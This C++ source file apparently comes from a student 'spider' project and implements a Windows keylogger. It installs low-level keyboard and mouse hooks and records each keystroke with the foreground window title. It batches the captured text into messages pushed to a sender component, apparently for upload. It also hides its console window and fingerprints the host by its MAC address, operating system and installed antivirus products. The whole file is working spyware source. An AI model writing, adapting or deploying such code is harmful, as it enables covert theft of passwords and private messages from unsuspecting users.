//
// KeyLogger.cpp for cpp_spider in /mnt/c/Users/Public/Projets/Tek3/cpp_spider/sources
//
// Made by Jeremy Thoveron
// Login   <jeremy.thoveron-@epitech.net>
//
// Started on  Fri Sep 29 16:21:07 2017 Jeremy Thoveron
// Last update Fri Sep 29 16:21:22 2017 Jeremy Thoveron
//

#include	"KeyLogger/WindowsKeyLogger.hpp"
#include	<iphlpapi.h>
#include	<iomanip>
#include 	<comdef.h>
#include 	<Wbemidl.h>
#include	<atlbase.h>
#include	<chrono>
#include	<memory>
#include	<sstream>
#include 	"Protocol/BufferSender.hpp"
#include        "Protocol/Serializer.hpp"

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "IPHLPAPI.lib")

HHOOK hookKeyboard;
HHOOK hookMouse;
std::string	buff;

LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
{
  PKBDLLHOOKSTRUCT 		content;
  char 				tmp[0xFF] = {0};
  std::string 			str;
  DWORD 			msg;
  bool				shift;
  bool				capslock;
  short				value;
  char				windowTitle[512];
  HWND				windowForeground;
  std::time_t			ts;
  std::stringstream		ss;
  std::string			timestamp;
  std::unique_ptr<t_message> 	infos(new t_message);

  /// initialisation and retrieve the timestamp for more accurate logs
  ts = std::time(nullptr);
  ss << ts;
  timestamp = ss.str();

  /// retrieve the windows title for more accurate logs
  windowForeground = GetForegroundWindow();
  GetWindowText(windowForeground, windowTitle, 512);


  infos.get()->timestamp = timestamp;
  infos.get()->process = windowTitle;
  infos.get()->type = "KEYSTROKE";


  /// initialisation of the shift and caps key
  shift = false;
  capslock = false;
  if (GetAsyncKeyState(VK_SHIFT))
    shift = true;
  value = GetKeyState(VK_CAPITAL);
  if ((value & 1) == 1)
    capslock = true;
  else
    capslock = false;
  msg = 1;
  /// check if the capslock key has already been pressed
  if ((code == HC_ACTION) && wp == WM_SYSKEYUP || wp == WM_KEYUP)
  {
    content = reinterpret_cast<PKBDLLHOOKSTRUCT >(lp);
    if (content->vkCode == VK_SHIFT)
      shift = false;
  }

  ///beginning of the recuperation for the keystroke
  if ((code == HC_ACTION) && (wp == WM_KEYDOWN || wp == WM_SYSKEYDOWN))
  {
    content = reinterpret_cast<PKBDLLHOOKSTRUCT>(lp);

    /// retrieve the str
    msg += (content->scanCode << 16);
    msg += (content->flags << 24);
    GetKeyNameText(msg, tmp, 0xFF);
    str = static_cast<std::string>(tmp);

    /// if the length of the string is less or equal of 1 it means that
    /// we have retrieved only one valid key.
    if (str.length() <= 1)
    {
      /// check if we should display it in upper or lower case
      if ((shift == true) ^ (capslock == true))
      {
	try
	{
	  str = spider::WindowsKeyLogger::correlingTable.at(static_cast<int>(str[0]));
	}
	catch (std::out_of_range const &)
	{
	  str = toupper(str[0]);
	}
      }
      else
	str = tolower(str[0]);
      buff += str;
    }
      /// actually the length of the str is superior at 1, it means that we have
      /// retrieved a vk code and that we should check either our correlingTable
      /// either our keys of vk code table
    else
    {
      try
      {
	str = spider::WindowsKeyLogger::keys.at(content->vkCode);
	buff += str;
      }
      catch (std::out_of_range const &)
      {
	/// need to brief to know what to do.
      }
    }
  }
  if (buff.length() > 255 || content->vkCode == VK_RETURN || content->vkCode == VK_TAB)
  {
    infos.get ()->data = buff;
    spider::BufferSender::BufferSenderInstance().push(
      spider::Serializer::getSerializer().get_string_from_ptree(
	spider::Serializer::getSerializer().serialize(*infos)));
    buff.clear();
  }
  return CallNextHookEx(hookKeyboard, code, wp, lp);
}

LRESULT CALLBACK 		handleMouse(int code, WPARAM wp, LPARAM lp)
{
  MSLLHOOKSTRUCT 		*mouseStruct;
  char 				windowTitle[512];
  HWND 				windowForeground;
  std::time_t			ts;
  std::stringstream		ss;
  std::string			timestamp;
  std::unique_ptr<t_mouse> 	infos(new t_mouse);
  std::unique_ptr<t_message>	kb(new t_message);
  bool				click;

  click = false;
  /// initialisation and retrieve the timestamp for more accurate logs
  ts = std::time(nullptr);
  ss << ts;
  timestamp = ss.str();

  /// retrieve the windows title for more accurate logs
  windowForeground = GetForegroundWindow();
  GetWindowText(windowForeground, windowTitle, 512);

  infos.get()->process = windowTitle;
  infos.get()->timestamp = timestamp;
  infos.get()->type = "MOUSE";

  kb.get()->process = windowTitle;
  kb.get()->timestamp = timestamp;
  kb.get()->type = "KEYSTROKE";

  mouseStruct = reinterpret_cast<MSLLHOOKSTRUCT *>(lp);

  infos.get()->keytype = KEYTYPE::KNONE;
  infos.get()->x = 0;
  infos.get()->y = 0;
  /// first check for the three mouse button and the mouse wheel
  switch (wp)
  {
    case (WM_LBUTTONDOWN):
      infos.get()->keytype = KEYTYPE::LC;
      infos.get()->y = static_cast<unsigned int>(mouseStruct->pt.y);
      infos.get()->x = static_cast<unsigned int>(mouseStruct->pt.x);
      click = true;
      break;
    case (WM_MBUTTONDOWN):
      infos.get()->keytype = KEYTYPE::MC;
      infos.get()->y = static_cast<unsigned int>(mouseStruct->pt.y);
      infos.get()->x = static_cast<unsigned int>(mouseStruct->pt.x);
      click = true;
      break;
    case (WM_RBUTTONDOWN):
      infos.get()->keytype = KEYTYPE::RC;
      infos.get()->y = static_cast<unsigned int>(mouseStruct->pt.y);
      infos.get()->x = static_cast<unsigned int>(mouseStruct->pt.x);
      click = true;
      break;
    case (WM_MOUSEWHEEL):
    {
      ///supplementary check to know in which direction is the mouse scrolled
      if (HIWORD(mouseStruct->mouseData) == 120)
      {
	infos.get()->keytype = KEYTYPE::SCROLLUP;
	infos.get()->y = static_cast<unsigned int>(mouseStruct->pt.y);
	infos.get()->x = static_cast<unsigned int>(mouseStruct->pt.x);
	break;
      }
      else
      {
	infos.get()->keytype = KEYTYPE::SCROLLDOWN;
	infos.get()->y = static_cast<unsigned int>(mouseStruct->pt.y);
	infos.get()->x = static_cast<unsigned int>(mouseStruct->pt.x);
	break;
      }
      default:
	break;
    }
  }
  if (infos.get()->keytype != KEYTYPE::KNONE)
    spider::BufferSender::BufferSenderInstance().push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(*infos)));
  if (click == true && buff.length() != 0)
  {
    kb.get()->data = buff;
    spider::BufferSender::BufferSenderInstance().push(
      spider::Serializer::getSerializer().get_string_from_ptree(
	spider::Serializer::getSerializer().serialize(*kb)));
    buff.clear();
  }
  return CallNextHookEx(hookMouse, code, wp, lp);
}

namespace spider
{
  WindowsKeyLogger::WindowsKeyLogger()
  {
    this->infos = new t_register();
  }

  WindowsKeyLogger::~WindowsKeyLogger()
  {
    delete this->infos;
  }

  void WindowsKeyLogger::stealth()
  {
    HWND stealth;

    AllocConsole();
    stealth = FindWindow("KeyLoggerWindow", nullptr);
    ShowWindow(stealth, 0);
  }

  void WindowsKeyLogger::initHooks()
  {
    if (hookKeyboard)
      UnhookWindowsHookEx(hookKeyboard);
    hookKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, static_cast<HOOKPROC>(handleKeyboard), nullptr, 0);
    if (hookMouse)
      UnhookWindowsHookEx(hookMouse);
    hookMouse = SetWindowsHookEx(WH_MOUSE_LL, static_cast<HOOKPROC>(handleMouse), nullptr, 0);
  }

  void WindowsKeyLogger::unHooks()
  {
    if (hookKeyboard)
      UnhookWindowsHookEx(hookKeyboard);
    if (hookMouse)
      UnhookWindowsHookEx(hookMouse);
  }

  void WindowsKeyLogger::getMacAddr()
  {
    IP_ADAPTER_INFO	AdapterInfo[16];
    PIP_ADAPTER_INFO 	pAdapterInfo;
    DWORD  		buffer;
    DWORD			status;
    std::stringstream	test;

    buffer = sizeof(AdapterInfo);
    status = GetAdaptersInfo(AdapterInfo, &buffer);
    if (status == ERROR_SUCCESS)
    {
      pAdapterInfo = AdapterInfo;
     test << std::hex << std::uppercase << std::setfill('0') <<
                std::setw(2) << static_cast<int>(pAdapterInfo->Address[0]) << ":" <<
                std::setw(2) << static_cast<int>(pAdapterInfo->Address[1]) << ":" <<
                std::setw(2) << static_cast<int>(pAdapterInfo->Address[2]) << ":" <<
                std::setw(2) << static_cast<int>(pAdapterInfo->Address[3]) << ":" <<
                std::setw(2) << static_cast<int>(pAdapterInfo->Address[4]) << ":" <<
                std::setw(2) << static_cast<int>(pAdapterInfo->Address[5]);
      this->infos->mac = test.str();
    }
    else
    {
      std::cout << "Impossible to resolve the mac address" << std::endl;
    }
  }

  void	WindowsKeyLogger::getOperatingSystem()
  {
  #ifdef _WIN32
    this->infos->os = "Windows";
  #endif
  }

  void WindowsKeyLogger::getAntiVirus()
  {
    HRESULT hres;
    IWbemLocator *locator = nullptr;
    IWbemServices *services = nullptr;
    IEnumWbemClassObject *pEnumerator = nullptr;
    IWbemClassObject *object = nullptr;
    ULONG uReturn = 0;
    std::string	antivirusList;

    hres = CoInitializeEx(nullptr, 0);
    if (FAILED(hres))
    {
      std::cerr << "Failed to initialize COM library" << std::endl;
      return ;
    }

    hres = CoInitializeSecurity(nullptr, -1, nullptr, nullptr, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE, nullptr);
    if (FAILED(hres))
    {
      std::cerr << "Failed to initialize security" << std::endl;
      return ;
    }

    hres = CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER, IID_IWbemLocator, reinterpret_cast<LPVOID *>(&locator));
    if (FAILED(hres))
    {
      std::cerr << "Fail to to create IWbemLocator object" << std::endl;
      return ;
    }

    hres = locator->ConnectServer(_bstr_t(L"root\\SecurityCenter2"), nullptr, nullptr, nullptr, 0, nullptr, nullptr, &services);
    if (FAILED(hres))
    {
      std::cerr << "Fail to connect" << std::endl;
      return ;
    }

    hres = CoSetProxyBlanket(services, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE);
    if (FAILED(hres))
    {
      std::cerr << "Could not set proxy blanket" << std::endl;
      return ;
    }

    wchar_t *query = bstr_t("Select * From AntiVirusProduct");
    hres = services->ExecQuery(bstr_t("WQL"), bstr_t("Select * From AntiVirusProduct"), WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnumerator);
    if (FAILED(hres))
    {
      std::cerr << "Query for antivirus name failed" << std::endl;
      return ;
    }

    while (pEnumerator)
    {
      pEnumerator->Next(WBEM_INFINITE, 1, &object, &uReturn);
      if (0 == uReturn)
      {
        break;
      }
      CComVariant cvtVersion;
      std::string	antivirus;
      object->Get(L"displayName", 0, &cvtVersion, 0, 0);
      antivirus = CW2A(cvtVersion.bstrVal);
      antivirusList.append(antivirus);
    }
    this->infos->antivirus = antivirusList;
    services->Release();
    locator->Release();
    pEnumerator->Release();
    CoUninitialize();
  }

  t_register const *WindowsKeyLogger::getInfos()
  { return this->infos; }
}

